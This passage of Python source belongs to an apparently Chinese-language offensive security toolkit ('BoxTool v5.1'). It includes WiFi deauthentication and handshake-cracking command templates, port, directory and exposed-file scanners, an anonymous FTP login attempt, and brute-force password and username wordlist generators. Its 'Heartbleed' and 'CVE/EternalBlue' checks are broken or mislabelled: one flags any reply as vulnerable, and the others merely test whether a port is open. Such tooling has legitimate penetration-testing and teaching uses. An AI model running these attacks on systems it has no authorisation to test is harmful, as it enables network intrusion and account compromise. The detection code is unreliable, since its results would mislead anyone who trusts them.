            except:
                return "[!] 无法获取网卡信息 (需要 iwconfig)"
        return f"[!] 不支持的系统：{system}"

    @staticmethod
    def scan_wifi(interface='wlan0mon', timeout=10):
        """扫描 WiFi 网络"""
        import platform
        if platform.system() != 'Linux':
            return "[!] WiFi 扫描仅支持 Linux 系统 (需要 aircrack-ng)"
        return f"[i] 扫描 WiFi: {interface}\n请使用：airodump-ng {interface}"

    @staticmethod
    def deauth_attack(target_mac, gateway_mac, interface='wlan0mon', count=100):
        """Deauth 攻击"""
        import platform
        if platform.system() != 'Linux':
            return "[!] Deauth 攻击仅支持 Linux 系统 (需要 aircrack-ng)"
        return f"[i] Deauth 攻击：{target_mac}\n请使用：aireplay-ng -0 {count} -a {gateway_mac} -c {target_mac} {interface}"

    @staticmethod
    def capture_handshake(interface='wlan0mon', target_bssid=None):
        """捕获握手包"""
        import platform
        if platform.system() != 'Linux':
            return "[!] 握手包捕获仅支持 Linux 系统 (需要 aircrack-ng)"
        return f"[i] 捕获握手包\n请使用：airodump-ng -c <channel> --bssid {target_bssid or '<BSSID>'} -w capture {interface}"

    @staticmethod
    def crack_handshake(handshake_file, wordlist):
        """破解握手包"""
        if not os.path.exists(handshake_file):
            return f"[!] 握手包文件不存在：{handshake_file}"
        if not os.path.exists(wordlist):
            return f"[!] 字典文件不存在：{wordlist}"
        return f"[i] 破解握手包\n请使用：aircrack-ng -w {wordlist} {handshake_file}"


# ============== 模块 8: 漏洞扫描器 ==============
class VulnScannerModule:
    """漏洞扫描器模块 - 纯 Python 实现"""

    @staticmethod
    def quick_scan(target):
        """快速扫描 - 纯 Python 端口 + 服务检测"""
        results = []
        results.append("=" * 60)
        results.append(f"快速扫描：{target}")
        results.append("=" * 60)
        
        # 常用端口
        ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 8080]
        open_ports = []
        
        for port in ports:
            try:
                s = socket.socket()
                s.settimeout(1)
                if s.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                    # 尝试获取 banner
                    try:
                        s.send(b"\r\n")
                        s.settimeout(0.5)
                        banner = s.recv(512).decode('utf-8', errors='ignore').strip()[:50]
                        if banner:
                            results.append(f"[+] 端口 {port} - {banner}")
                        else:
                            results.append(f"[+] 端口 {port} 开放")
                    except:
                        results.append(f"[+] 端口 {port} 开放")
                s.close()
            except:
                pass
        
        if not open_ports:
            return "[-] 未发现开放端口"
        return "\n".join(results)

    @staticmethod
    def full_scan(target):
        """全面扫描 - 更多端口"""
        results = []
        results.append("=" * 60)
        results.append(f"全面扫描：{target}")
        results.append("=" * 60)
        
        # 扫描前 1000 个端口
        ports = list(range(1, 1001))
        open_ports = []
        
        def scan_port(port):
            try:
                s = socket.socket()
                s.settimeout(0.3)
                if s.connect_ex((target, port)) == 0:
                    return port
                s.close()
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
                    results.append(f"[+] 端口 {result} 开放")
        
        results.append(f"\n共发现 {len(open_ports)} 个开放端口")
        return "\n".join(results)

    @staticmethod
    def vuln_scan(target):
        """漏洞扫描 - CVE 检测"""
        results = []
        results.append("=" * 60)
        results.append(f"漏洞扫描：{target}")
        results.append("=" * 60)
        
        # 常见漏洞端口检测
        vuln_ports = {
            445: 'SMB (检查 EternalBlue)',
            3389: 'RDP (检查 BlueKeep)',
            21: 'FTP (检查匿名登录)',
            23: 'Telnet (明文传输)',
        }
        
        for port, vuln in vuln_ports.items():
            try:
                s = socket.socket()
                s.settimeout(1)
                if s.connect_ex((target, port)) == 0:
                    results.append(f"[!] 端口 {port} - {vuln}")
                s.close()
            except:
                pass
        
        if not results:
            return "[-] 未发现已知漏洞"
        return "\n".join(results)

    @staticmethod
    def cve_scan(target):
        """CVE 检测"""
        return VulnScannerModule.vuln_scan(target)

    @staticmethod
    def web_vuln_scan(url):
        """Web 漏洞扫描"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        results = []
        results.append("=" * 60)
        results.append(f"Web 漏洞扫描：{url}")
        results.append("=" * 60)
        
        # 检测常见 Web 漏洞
        tests = [
            ('/.git/config', 'Git 配置暴露'),
            ('/.env', '环境变量文件暴露'),
            ('/phpinfo.php', 'PHPInfo 暴露'),
            ('/wp-config.php.bak', 'WordPress 配置备份'),
        ]
        
        base_url = url.rstrip('/')
        for path, vuln in tests:
            try:
                r = requests.get(f"{base_url}{path}", timeout=5, headers=get_headers(), verify=False)
                if r.status_code == 200 and len(r.text) > 50:
                    results.append(f"[!] {vuln}: {path}")
            except:
                pass
        
        if not results:
            return "[-] 未发现 Web 漏洞"
        return "\n".join(results)

    @staticmethod
    def heartbleed_check(host, port=443):
        """Heartbleed 心脏出血漏洞检测"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            
            # TLS 握手
            hello = bytes([
                0x18, 0x03, 0x02, 0x00, 0x01, 0x01,
                0x00, 0x01, 0x00, 0x00, 0x00, 0x00
            ])
            s.send(hello)
            
            # 心跳请求
            heartbeat = bytes([
                0x18, 0x03, 0x02, 0x00, 0x03,
                0x01, 0x40, 0x00
            ])
            s.send(heartbeat)
            
            s.settimeout(2)
            try:
                response = s.recv(1024)
                if len(response) > 10:
                    return f"[!] {host}:{port} 可能存在 Heartbleed 漏洞"
            except:
                pass
            
            s.close()
            return f"[-] {host}:{port} 未发现 Heartbleed 漏洞"
        except Exception as e:
            return f"[!] Heartbleed 检测失败：{str(e)}"


# ============== 模块 9: 报告生成 ==============
class ReportModule:
    """渗透测试报告生成模块"""

    findings = []

    @staticmethod
    def generate_report(target, findings_list=None, output_file='pentest_report.html'):
        """生成 HTML 报告"""
        findings = findings_list or ReportModule.findings
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>渗透测试报告 - {target}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #1a1a1a; color: #eee; }}
        h1 {{ color: #00ff00; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }}
        h2 {{ color: #00cc00; margin-top: 30px; }}
        .finding {{ background: #2a2a2a; padding: 15px; margin: 10px 0; border-left: 4px solid #00ff00; }}
        .high {{ border-color: #ff0000; }}
        .medium {{ border-color: #ffaa00; }}
        .low {{ border-color: #00aa00; }}
        .info {{ border-color: #0088ff; }}
        code {{ background: #333; padding: 2px 6px; border-radius: 3px; }}
    </style>
</head>
<body>
    <h1>渗透测试报告</h1>
    <p><strong>目标:</strong> {target}</p>
    <p><strong>日期:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <h2>发现的问题</h2>
'''
        
        if findings:
            for f in findings:
                severity = f.get('severity', 'info')
                html += f'''    <div class="finding {severity}">
        <h3>{f.get("title", "未命名")}</h3>
        <p><strong>严重程度:</strong> {severity.upper()}</p>
        <p>{f.get("description", "")}</p>
    </div>
'''
        else:
            html += '<p>[-] 未发现漏洞</p>'

        html += '''
    <footer style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #444; color: #888;">
        <p>Generated by BoxTool v5.1</p>
    </footer>
</body>
</html>'''

        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html)
            return f"报告已生成：{output_file}"
        except Exception as e:
            return f"报告生成失败：{str(e)}"

    @staticmethod
    def add_finding(severity, title, description):
        """添加发现到报告"""
        ReportModule.findings.append({
            'severity': severity,
            'title': title,
            'description': description,
            'timestamp': datetime.now().isoformat()
        })
        return f"[+] 已添加：{title}"

    @staticmethod
    def add_finding_high(target, title):
        """添加高危发现"""
        return ReportModule.add_finding('high', title, f"目标：{target}")

    @staticmethod
    def add_finding_medium(target, title):
        """添加中危发现"""
        return ReportModule.add_finding('medium', title, f"目标：{target}")

    @staticmethod
    def export_json(output_file='pentest_report.json'):
        """导出 JSON 格式"""
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(ReportModule.findings, f, ensure_ascii=False, indent=2)
            return f"已导出：{output_file}"
        except Exception as e:
            return f"导出失败：{str(e)}"


# ============== 模块 10: 辅助工具 ==============
class UtilsModule:
    """辅助工具模块 - 专业级字典生成"""

    # 常用密码前缀/后缀
    COMMON_PREFIXES = ['123', 'abc', 'admin', 'root', 'pass', 'pwd', '1234', 'qwerty']
    COMMON_SUFFIXES = ['123', '1234', '123456', '!', '@', '#', '2024', '2025', '2026']
    
    # 常见用户名
    COMMON_USERNAMES = [
        'admin', 'administrator', 'root', 'user', 'test', 'guest',
        'manager', 'operator', 'service', 'backup', 'oracle', 'mysql',
        'postgres', 'www', 'web', 'ftp', 'mail', 'postfix',
        'support', 'info', 'sales', 'contact', 'help', 'system',
        'super', 'superuser', 'sysadmin', 'webmaster', 'nginx', 'apache',
    ]

    @staticmethod
    def md5_hash(text):
        """MD5 哈希"""
        return hashlib.md5(text.encode()).hexdigest()

    @staticmethod
    def sha256_hash(text):
        """SHA256 哈希"""
        return hashlib.sha256(text.encode()).hexdigest()

    @staticmethod
    def sha1_hash(text):
        """SHA1 哈希"""
        return hashlib.sha1(text.encode()).hexdigest()

    @staticmethod
    def base64_encode(text):
        """Base64 编码"""
        return base64.b64encode(text.encode()).decode()

    @staticmethod
    def base64_decode(text):
        """Base64 解码"""
        try:
            return base64.b64decode(text.encode()).decode()
        except:
            return "[!] 解码失败"

    @staticmethod
    def url_encode(text):
        """URL 编码"""
        return quote(text)

    @staticmethod
    def url_decode(text):
        """URL 解码"""
        return unquote(text)

    @staticmethod
    def _get_dict_path():
        """获取字典保存路径（自动使用 wordlists 文件夹）"""
        wordlists_dir = os.path.join(os.path.dirname(__file__), 'wordlists')
        if not os.path.exists(wordlists_dir):
            os.makedirs(wordlists_dir)
        return wordlists_dir

    @staticmethod
    def generate_password_dict(output_name='custom_passwords.txt', mode='mixed', 
                               length=8, count=10000, size_mb=None,
                               include_upper=True, include_lower=True, 
                               include_digits=True, include_symbols=False,
                               custom_patterns=None):
        """
        专业密码字典生成器
        
        参数:
            output_name: 输出文件名
            mode: 生成模式 ('numeric', 'lower', 'upper', 'mixed', 'pattern', 'common')
            length: 密码长度
            count: 生成数量
            size_mb: 目标文件大小 (MB)，如果设置则覆盖 count
            include_upper: 包含大写字母
            include_lower: 包含小写字母
            include_digits: 包含数字
            include_symbols: 包含符号
            custom_patterns: 自定义模式列表 (如 ['aabb', 'abcd', '1122'])
        """
        import itertools
        
        wordlists_dir = UtilsModule._get_dict_path()
        output_path = os.path.join(wordlists_dir, output_name)
        
        # 字符集构建
        chars = ''
        if include_lower: chars += string.ascii_lowercase
        if include_upper: chars += string.ascii_uppercase
        if include_digits: chars += string.digits
        if include_symbols: chars += '!@#$%^&*()_+-=[]{}|;:,.<>?'
        
        if not chars:
            chars = string.ascii_letters + string.digits
        
        passwords = set()
        
        # 模式 1: 纯数字
        if mode == 'numeric':
            chars = string.digits
            while len(passwords) < count:
                pwd = ''.join(random.choices(chars, k=length))
                passwords.add(pwd)
        
        # 模式 2: 纯小写
        elif mode == 'lower':
            chars = string.ascii_lowercase
            while len(passwords) < count:
                pwd = ''.join(random.choices(chars, k=length))
                passwords.add(pwd)
        
        # 模式 3: 纯大写
        elif mode == 'upper':
            chars = string.ascii_uppercase
            while len(passwords) < count:
                pwd = ''.join(random.choices(chars, k=length))
                passwords.add(pwd)
        
        # 模式 4: 混合字符
        elif mode == 'mixed':
            while len(passwords) < count:
                pwd = ''.join(random.choices(chars, k=length))
                passwords.add(pwd)
        
        # 模式 5: 模式化生成 (aabb, abcd, 1122 等)
        elif mode == 'pattern':
            patterns = custom_patterns or ['aabb', 'abab', 'aabbcc', 'abcd', '1122', '1212']
            for pattern in patterns:
                for _ in range(count // len(patterns)):
                    pwd = ''
                    used = {}
                    for c in pattern:
                        if c not in used:
                            if c in 'abcd':
                                used[c] = random.choice(string.ascii_lowercase)
                            elif c in 'ABCD':
                                used[c] = random.choice(string.ascii_uppercase)
                            elif c in '1234':
                                used[c] = random.choice(string.digits)
                        pwd += used.get(c, 'a')
                    passwords.add(pwd)
        
        # 模式 6: 常见密码组合
        elif mode == 'common':
            # 常见密码 + 数字/符号
            common_bases = ['password', 'admin', 'root', '123456', 'qwerty', 'abc123']
            for base in common_bases:
                passwords.add(base)
                for suffix in ['123', '1234', '123456', '!', '@', '#', '2024', '2025']:
                    passwords.add(base + suffix)
                    passwords.add(base + suffix + '!')
            
            # 键盘模式
            keyboard_patterns = ['qwerty', 'asdfgh', 'zxcvbn', '123456', '654321', 'qwertyuiop']
            for pattern in keyboard_patterns:
                passwords.add(pattern)
                passwords.add(pattern.upper())
        
        # 模式 7: 智能组合 (最实用)
        elif mode == 'smart':
            # 常见单词 + 数字
            words = ['admin', 'root', 'password', 'user', 'test', 'guest', 'oracle', 'mysql']
            for word in words:
                passwords.add(word)
                for num in ['123', '1234', '123456', '2024', '2025', '2026']:
                    passwords.add(word + num)
                    passwords.add(word + num + '!')
                    passwords.add(word.upper() + num)
            
            # 大小写组合
            for word in ['Password', 'Admin', 'Root', 'User']:
                passwords.add(word)
                passwords.add(word + '123')
                passwords.add(word + '123!')
        
        # 按文件大小生成
        if size_mb:
            target_bytes = size_mb * 1024 * 1024
            current_size = 0
            with open(output_path, 'w') as f:
                while current_size < target_bytes:
                    if mode == 'smart':
                        pwd = ''.join(random.choices(chars, k=random.randint(6, 12)))
                    else:
                        pwd = ''.join(random.choices(chars, k=length))
                    line = pwd + '\n'
                    f.write(line)
                    current_size += len(line.encode('utf-8'))
            return f"已生成 {size_mb}MB 密码字典：{output_path}"
        
        # 写入文件
        with open(output_path, 'w', encoding='utf-8') as f:
            for pwd in passwords:
                f.write(pwd + '\n')
        
        return f"已生成 {len(passwords)} 条密码到 {output_path} ({os.path.getsize(output_path) / 1024:.1f} KB)"

    @staticmethod
    def generate_username_dict(output_name='custom_usernames.txt', 
                               mode='common', count=100,
                               custom_prefix='', custom_suffix='',
                               include_numbers=True):
        """
        用户名字典生成器
        
        参数:
            output_name: 输出文件名
            mode: 生成模式 ('common', 'admin', 'service', 'custom')
            count: 生成数量
            custom_prefix: 自定义前缀
            custom_suffix: 自定义后缀
            include_numbers: 是否包含数字后缀
        """
        wordlists_dir = UtilsModule._get_dict_path()
        output_path = os.path.join(wordlists_dir, output_name)
        
        usernames = set()
        
        if mode == 'common':
            # 常见用户名
            usernames.update(UtilsModule.COMMON_USERNAMES)
            
            # 带数字的变体
            if include_numbers:
                for name in UtilsModule.COMMON_USERNAMES[:20]:
                    for num in ['1', '12', '123', '2024', '2025']:
                        usernames.add(name + num)
        
        elif mode == 'admin':
            # 管理员相关
            admin_names = ['admin', 'administrator', 'root', 'super', 'superuser', 
                          'sysadmin', 'webmaster', 'manager', 'operator']
            usernames.update(admin_names)
            for name in admin_names:
                usernames.add(name + '123')
                usernames.add(name.upper())
                usernames.add(name.capitalize())
        
        elif mode == 'service':
            # 服务账户
            service_names = ['www', 'web', 'ftp', 'mail', 'mysql', 'postgres', 
                           'oracle', 'nginx', 'apache', 'tomcat', 'redis', 'mongodb']
            usernames.update(service_names)
        
        elif mode == 'custom':
            # 自定义生成
            bases = ['user', 'admin', 'test', 'guest']
            for base in bases:
                for i in range(1, count // 4 + 1):
                    usernames.add(f"{custom_prefix}{base}{i}{custom_suffix}")
        
        # 写入文件
        with open(output_path, 'w', encoding='utf-8') as f:
            for name in sorted(usernames):
                f.write(name + '\n')
        
        return f"已生成 {len(usernames)} 个用户名到 {output_path} ({os.path.getsize(output_path) / 1024:.1f} KB)"

    @staticmethod
    def generate_smart_dict(output_name='smart_passwords.txt', target_mb=1):
        """
        智能密码字典 - 结合常见密码模式
        
        生成的密码包括:
        - 常见密码 + 数字组合
        - 大小写变换
        - 键盘模式
        - 日期组合
        - 符号变换
        """
        wordlists_dir = UtilsModule._get_dict_path()
        output_path = os.path.join(wordlists_dir, output_name)
        
        passwords = set()
        
        # 1. 基础常见密码
        base_passwords = [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'baseball', 'abc123', 'football', 'monkey',
            'letmein', 'shadow', 'master', '666666', 'qwertyuiop',
            '123321', 'mustang', '1234567890', 'microsoft', 'admin',
        ]
        passwords.update(base_passwords)
        
        # 2. 常见密码 + 数字后缀
        for base in base_passwords[:30]:
            for num in ['123', '1234', '520', '1314', '2024', '2025', '2026']:
                passwords.add(base + num)
        
        # 3. 大小写变换
        for base in ['Password', 'Admin', 'Root', 'User', 'Test', 'Guest']:
            passwords.add(base)
            passwords.add(base + '123')
            passwords.add(base + '123!')
            passwords.add(base + '2024')
            passwords.add(base + '2025')
        
        # 4. 键盘模式
        keyboard = ['qwerty', 'asdfgh', 'zxcvbn', 'qazwsx', '1qaz2wsx', '1q2w3e4r']
        passwords.update(keyboard)
        passwords.update([k.upper() for k in keyboard])
        
        # 5. 日期组合
        for year in ['2020', '2021', '2022', '2023', '2024', '2025', '2026']:
            passwords.add('admin' + year)
            passwords.add('root' + year)
            passwords.add('password' + year)
            passwords.add(year + '123')
        
        # 6. 符号变换
        for base in ['admin', 'root', 'password']:
            passwords.add(base + '!')
            passwords.add(base + '@')
            passwords.add(base + '#')
            passwords.add(base + '123!')
        
        # 生成到目标大小
        target_bytes = target_mb * 1024 * 1024
        chars = string.ascii_letters + string.digits + '!@#$%'
        
        with open(output_path, 'w', encoding='utf-8') as f:
            # 先写智能密码
            for pwd in passwords:
                f.write(pwd + '\n')
            
            # 如果不够，补充随机组合
            current_size = os.path.getsize(output_path)
            while current_size < target_bytes:
                length = random.randint(6, 12)
                pwd = ''.join(random.choices(chars, k=length))
                f.write(pwd + '\n')
                current_size += len((pwd + '\n').encode('utf-8'))
        
        return f"已生成智能密码字典：{output_path} ({target_mb} MB)"

    @staticmethod
    def ip_info(ip):
        """IP 信息查询 (ip-api.com)"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}?lang=zh-CN", timeout=10)
            data = r.json()
            if data.get('status') == 'success':
                lines = [
                    f"IP: {data.get('query')}",
                    f"国家：{data.get('country')}",
                    f"省份：{data.get('regionName')}",
                    f"城市：{data.get('city')}",
                    f"ISP: {data.get('isp')}",
                    f"组织：{data.get('org')}",
                ]
                return "\n".join(lines)
            return f"查询失败：{data.get('message', '未知错误')}"
        except Exception as e:
            return f"IP 查询失败：{str(e)}"

    @staticmethod
    def port_check(host, port):
        """单端口检查"""
        try:
            s = socket.socket()
            s.settimeout(2)
            if s.connect_ex((host, port)) == 0:
                return f"[+] 端口 {port} 开放"
            return f"[-] 端口 {port} 关闭"
        except Exception as e:
            return f"[!] 检查失败：{str(e)}"


# ============== 模块 11: Metasploit 替代方案 ==============
class MetasploitModule:
    """Metasploit 替代方案 - 纯 Python 实现漏洞检测"""
    # 注意：不再依赖 msfconsole，使用纯 Python 实现常见漏洞检测

    @staticmethod
    def vuln_scan(target):
        """漏洞扫描 - 纯 Python 实现"""
        results = []
        results.append("=" * 60)
        results.append(f"漏洞扫描：{target}")
        results.append("=" * 60)
        
        # 检测常见漏洞端口
        vuln_checks = {
            21: ('FTP', '检查匿名登录'),
            22: ('SSH', '检查弱密码'),
            23: ('Telnet', '明文传输风险'),
            80: ('HTTP', 'Web 漏洞扫描'),
            443: ('HTTPS', 'SSL/TLS 检测'),
            445: ('SMB', 'EternalBlue 检测'),
            3306: ('MySQL', '弱密码检测'),
            3389: ('RDP', 'BlueKeep 检测'),
            6379: ('Redis', '未授权访问'),
            27017: ('MongoDB', '未授权访问'),
        }
        
        for port, (service, check) in vuln_checks.items():
            try:
                s = socket.socket()
                s.settimeout(1)
                if s.connect_ex((target, port)) == 0:
                    results.append(f"[!] 端口 {port} ({service}) - {check}")
                s.close()
            except:
                pass
        
        if not results:
            return "[-] 未发现已知漏洞"
        return "\n".join(results)

    @staticmethod
    def smb_check(target):
        """SMB 漏洞检测"""
        results = []
        results.append("=" * 60)
        results.append(f"SMB 检测：{target}")
        results.append("=" * 60)
        
        try:
            s = socket.socket()
            s.settimeout(2)
            if s.connect_ex((target, 445)) == 0:
                results.append("[+] 端口 445 (SMB) 开放")
                results.append("[!] 建议检查：EternalBlue (MS17-010)")
                results.append("[!] 建议检查：SMB 签名状态")
                results.append("[!] 建议检查：SMB 版本")
            else:
                results.append("[-] 端口 445 关闭")
            s.close()
        except Exception as e:
            results.append(f"[!] 检测失败：{str(e)}")
        
        return "\n".join(results)

    @staticmethod
    def ftp_check(target):
        """FTP 漏洞检测"""
        results = []
        results.append("=" * 60)
        results.append(f"FTP 检测：{target}")
        results.append("=" * 60)
        
        try:
            s = socket.socket()
            s.settimeout(2)
            if s.connect_ex((target, 21)) == 0:
                results.append("[+] 端口 21 (FTP) 开放")
                # 尝试匿名登录
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, 21, timeout=2)
                    ftp.login('anonymous', 'test@test.com')
                    results.append("[!] 匿名登录允许!")
                    ftp.quit()
                except:
                    results.append("[-] 匿名登录不允许")
            else:
                results.append("[-] 端口 21 关闭")
            s.close()
        except Exception as e:
            results.append(f"[!] 检测失败：{str(e)}")
        
        return "\n".join(results)

    @staticmethod
    def ssh_check(target):
        """SSH 漏洞检测"""
        results = []
        results.append("=" * 60)
        results.append(f"SSH 检测：{target}")
        results.append("=" * 60)
        
        try:
            s = socket.socket()
            s.settimeout(2)
            if s.connect_ex((target, 22)) == 0:
                results.append("[+] 端口 22 (SSH) 开放")
                results.append("[!] 建议检查：弱密码")
                results.append("[!] 建议检查：SSH 版本")
            else:
                results.append("[-] 端口 22 关闭")
            s.close()
        except Exception as e:
            results.append(f"[!] 检测失败：{str(e)}")
        
        return "\n".join(results)

    @staticmethod
    def mysql_check(target):
        """MySQL 漏洞检测"""
        results = []
        results.append("=" * 60)
        results.append(f"MySQL 检测：{target}")
        results.append("=" * 60)
        
        try:
            s = socket.socket()
            s.settimeout(2)
            if s.connect_ex((target, 3306)) == 0:
                results.append("[+] 端口 3306 (MySQL) 开放")
                results.append("[!] 建议检查：弱密码")
                results.append("[!] 建议检查：远程 root 登录")
            else:
                results.append("[-] 端口 3306 关闭")
            s.close()
        except Exception as e:
            results.append(f"[!] 检测失败：{str(e)}")
        
        return "\n".join(results)

    @staticmethod
    def web_dir_scan(target):
        """Web 目录扫描"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        results = []
        dirs = [
            'admin', 'backup', 'config', 'upload', 'files',
            'api', 'v1', 'v2', 'test', 'dev', 'staging',
        ]
        
        base_url = target.rstrip('/')
        for d in dirs:
            try:
                r = requests.get(f"{base_url}/{d}", timeout=5, headers=get_headers(), verify=False)
                if r.status_code == 200:
                    results.append(f"[200] /{d}")
                elif r.status_code in [301, 302]:
                    results.append(f"[{r.status_code}] /{d} -> {r.headers.get('location', '')}")
            except:
                pass
        
        return f"发现 {len(results)} 个目录:\n" + "\n".join(results) if results else "[-] 未发现目录"


# 导出所有模块
__all__ = [
    'ReconModule', 'ScanModule', 'WebModule', 'BruteModule',
    'ShodanModule', 'AIModule', 'WifiModule', 'VulnScannerModule',
    'ReportModule', 'UtilsModule', 'MetasploitModule',
]
